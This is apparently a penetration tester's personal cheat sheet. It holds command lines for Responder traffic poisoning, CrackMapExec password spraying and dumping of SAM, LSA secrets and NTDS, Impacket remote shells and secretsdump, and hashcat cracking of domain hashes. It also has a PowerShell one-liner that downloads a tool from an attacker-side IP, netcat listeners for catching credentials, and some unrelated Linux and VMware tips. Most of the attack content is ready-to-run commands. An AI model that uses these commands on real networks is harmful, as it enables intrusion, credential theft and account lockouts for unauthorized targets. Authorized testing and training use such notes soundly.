# Just Some Notes I Have

### Responder
* https://github.com/lgandx/Responder 
* python Responder.py -I eth0
	* add -wrt for wpad, but don't run this for very long
	* -A to just analyze and not poison traffic
	* if relaying, turn off http and smb in Responder.conf
	* logs: /usr/share/responder/logs
* has additional tools ie. RunFinger.py to fingerprint a service

### AutoRecon 
Uses Python3
* https://github.com/Tib3rius/AutoRecon

### Linux Privilege Escalation
* LSE - https://github.com/diego-treitos/linux-smart-enumeration 
  * wget lse.sh;chmod 700 lse.sh; ./lse.sh > lse.txt
* Linux Exploit Suggester - https://github.com/jondonas/linux-exploit-suggester-2
  * wget les.pl; chmod 700 les.pl; perl les.pl > les.txt
* G0tM1lk - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### Windows Privilege Escalation 
* Powerless - https://github.com/M4ximuss/PowerlessPowerUp
* PowerUp - https://github.com/HarmJ0y/PowerUp
* Sherlock - https://github.com/rasta-mouse/Sherlock
* Fuzzy Security - https://www.fuzzysecurity.com/tutorials/16.html

### CrackMapExec
* **Download:** git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
* **Simple Scan:** cme smb [file of IPs \|IP]
* **Password Spray Against Domain:** cme smb [IP] -u [file of usernames] -p [one password]
  * Be very careful, one IP, one password, or it'll lock out the users
* **Useful CME Flags:** cme smb [IP] -u [user] -p [pass]\| -H [hash]
  * Domain Password Policy: --pass-pol
  * Use local authentication: --local-auth
  * Find SMB Shares: --shares
  * Find Loot: --spider [Share Name] --depth [how deep, ie. 10] --pattern [ssn\|password\|credit]
   * --shares \| egrep -v "([-]|[+]|[*]\|--\|ADMIN\|print\|IPC\|Default share\|Remark)"  
  * Extract SAM: --sam
  * Get LSA Secrets: --lsa 
  * Who is currently logged in: --loggedon-users
  * Load a Module: -M ie. Mimikatz
  * SCF Module: -M scuffy -o SERVER=[local machine IP] NAME=myscf [CLEANUP=TRUE]
  * Continue on Success: --continue-on-success
  * Extract NTDS: --ntds drsuapi
  * Changed "pn3d": /root/.cme/cme.cnf
 
 **CME DB:** 
  * cmedb
  * proto smb
  * cleartext

### Impacket
* **Install** - git clone https://github.com/SecureAuthCorp/impacket.git
   * python setup.py install
* **Log in via SMB:** psexec.py - [domain]/[username]:[password]@[ip] (optional --hashes LM:NTLM) 
* **Extract NTDS history:** secretsdump.py [domain]/[username]@[ip] -history \| tee ntds.txt
* **To get Windows Shell:** wmiexec.py [domain]/[username]:[password]@[host ip]
* **32 or 64 bit architecture:** getArch.py -target [IP]
* **Relay NTLMv2 hashes:** https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
* **SMB Server for transferring files:** 
   * smbserver.py -comment 'My share' TMP /tmp
   * Then on Windows host: copy [file] \\[local IP]\TMP 
   * Find the file in local machine's /tmp dir

### Passsword Cracking
#### Cracking NTDS file
1. Don't bother with machine hashes (showed with a $ at end of username)
1. Only care about LM and NTLM
1. Crack the LM first
  	* hashcat -m3000 hashfile -a0 -w4 ?a?a?a?a?a?a?a --increment
1. Extract all cracked values and put them in a file
  	* hashcat -m3000 hashfile --show --username \| cut -d : -f3 > lm-cracked.txt
1. Use the file to crack NTLM
  	* hashcat -m1000 hashfile -a0 -w4 -O -r rules/d3ad0ne.rule lm-cracked.txt 
1. If hashcat's potfile is big enough, use that as a wordlist
  	* cat [path to potfile] \| cut -d : -f2 > words
  	* hashcat -m1000 words -a0 -w4 -O -r rules/d3ad0ne.rule words
1. Start using wordlists, from smaller to larger, for speed. Alternate with re-doing step 6.
  	* rockyou (small), crackstation (large)
1. Use common masks (use -a3): https://blog.rapid7.com/2018/08/22/password-tips-from-a-pen-tester-taking-the-predictability-out-of-common-password-patterns/
1. Useful mask: -1 '!@#$' -2 ?d?1 -3 ?u?l --increment ?3?3?2?2?2?2?2?2?2?2?2 (credit: twitter.com/golem445)
1. Run Pipal, look for commonalities/patterns/more masks: 
	1. Extract the passwords only: hashcat -m1000 hashes --show --username \| cut -d : -f2 > passwords.txt
	1. pipal passwords.txt > pipal.txt 


#### DCC - Domain Cached Credential (obtained by --lsa in cme)
* To crack: $DCC2$10240#username#e4e938d12fe5974dc42a90a20bd9c60f
* Hashcat: -m2100
* example: $DCC2$10240#AMoose#e0899f4c0319313ab289b367abf5413a

### File Transfers
* powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.1.101:8070/procdump.exe','C:\procdump.exe')"
* netcat
* tftp
* smbclient
* wget
* scp
* python -m SimpleHTTPServer 

### Remote Port Forwarding
* ssh -R [local port]:127.0.0.1:[target port] [user]@[local-ip]
  * Connect to the local port

### Create a SHA-512 Password (Goes in an /etc/shadow file)
* mkpasswd -m sha-512 [password]

### HTTP PUT Method Enabled
* curl http://myservice --upload-file file.txt

### HTTP MOVE Method Enabled
* MOVE /pub2/folder1/ HTTP/1.1
* Destination: http://www.hostname.com/pub2/folder2/
* Host: www.hostname.com
Or
* curl -X MOVE --header 'Destination:http://example.org/new.txt' 'https://example.com/old.txt'

### Updating the PATH variable
* export PATH=$PATH:<new path>
	
### Gobuster
* https://github.com/OJ/gobuster
* (Usage:) gobuster dir -u [IP] -w [wordlist] 

### SNAC
* https://github.com/arch4ngel/eavesarp
* ./eavesarp.py capture -i eth0 -ar -dr 
* Find the TRUE stale 
* Create a new pseudo adapter: 
	* ifconfig eth0:1 [IP to spoof] netmask [ie 255.255.252.0]
	* ifconfig eth0:1
* Watch what comes up for requests to a port
* Create a netcat listener to capture those requests
	* nc -nlvp[u if UDP] [port number]
* Maybe get creds or see a weak service to replicate

### If VMTools is not doing copy/paste or other weirdness
1. killall -q -w vmtoolsd
1. vmware-user-suid-wrapper vmtoolsd -n vmusr 2>/dev/null
1. vmtoolsd -b /var/run/vmroot 2>/dev/null

### Sed Commands
* Extract lines 100 to 200 from a file:
sed -n -e '100,200p' scope2.txt > 200-ip.txt

* To remove ^M from files, use sed:
sed -i -e "s/^<ctrl+v+m>" <file>
	
* Find or Replace in a file
sed -i 's/original/new/g' file.txt

* Append text to every line in a file:
awk '$0=$0"text-to-append"' filename
https://stackoverflow.com/questions/15978504/add-text-at-the-end-of-each-line
sed 's/$/:80/' ips.txt > new-ips.txt

* Prepend a string to each line in a file
sed -e 's/^/MAIN-CAMPUS\\/' file.txt > file.new

### Find Domain Controllers
* Read /etc/resolv.conf
* Should give a couple IPs of DCs
* Run nmap for 445 and 53

### Upgrade Kali
* sudo apt-get update
* sudo apt-get dist-upgrade

### Creating shared folders on Linux in VMWare
* http://askubuntu.com/questions/591664/files-missing-in-mnt-hgfs-on-ubuntu-vm
* Go to Virtual Machine menu dropdown > Sharing > add the folder
* Folder will be in /mnt/hgfs on VM

### Install VMWare VM Tools
* https://kb.vmware.com/s/article/1022525

### Get TCP timestamp on a server
* hping3 url.com -c 2 --tcp-timestamp -p 443 -S

### Terminator: http://techtootech.blogspot.com/2014/11/installing-terminator-on-kali-linux.html
* apt-get install terminator

### Proxy Chrome through Burp on Kali:
* /usr/bin/google-chrome-stable %U --no-sandbox --user-data-dir —proxy-server=127.0.0.1 &

### Pull IP addresses out of nmap ping scan
* grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" ping >> up-hosts
** Or use cut/awk (see above)
